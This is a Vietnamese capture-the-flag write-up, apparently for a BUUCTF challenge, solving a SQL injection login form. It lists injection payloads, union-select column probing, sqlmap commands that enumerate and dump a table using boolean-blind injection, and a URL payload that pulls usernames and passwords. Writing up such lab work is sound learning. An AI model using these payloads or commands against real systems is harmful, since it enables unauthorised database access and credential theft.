Ta có form challenge 

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/44737ee2-00de-4178-bdc5-bf88ded795af)

Mình thử vài payload đơn giản trước sau đó xác định số column.Với payload `'or 1=1-- -` cho kết quả

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/d2118455-d23e-4b00-9dce-0a77a069adda)

Nhưng nó không có dễ tới mức như vậy, nên mình xác định columns `1'union select 1,2,3-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/bfcfc454-e714-4353-8890-5fb72dbb7c95)

Vậy là có 3 trường và điểm hiển thị là 2 và 3.Mình sẽ dùng sql map để làm bài này cho nhanh.

Ta lấy request khi login vào và để password là `*` để chọn đó làm điểm inject. Ta sử dụng command này `python3 sqlmap -r Blind.txt --dbs --technique=B --string="admin"`

–technique là B(Boolean-Based Blind SQL injection), –string là admin để nó bắt chuỗi admin khi câu lệnh là đúng. Kết quả trả về:

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/d8bd7cfc-67d7-4e4f-8587-b90de903c2ba)

Bây giờ ta sẻ liệt kê trong database Geek `python3 sqlmap.py -r Blind.txt -D geek -tables --technique=B --string="admin"`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/04d488d8-f705-4423-a588-b59a3a06ccad)

Kết quả cho ra 2 table, mình sẽ dump để tìm ra flag `python3 sqlmap -r Blind.txt -D geek -T l0ve1ysq1 --dump --technique=B --string="admin"`

Hoặc là nhanh hơn dùng payload này `/check.php?username=admin' and 1=2 union select 1,2,group_concat(id,username,password) from l0ve1ysq1-- -&password=1`






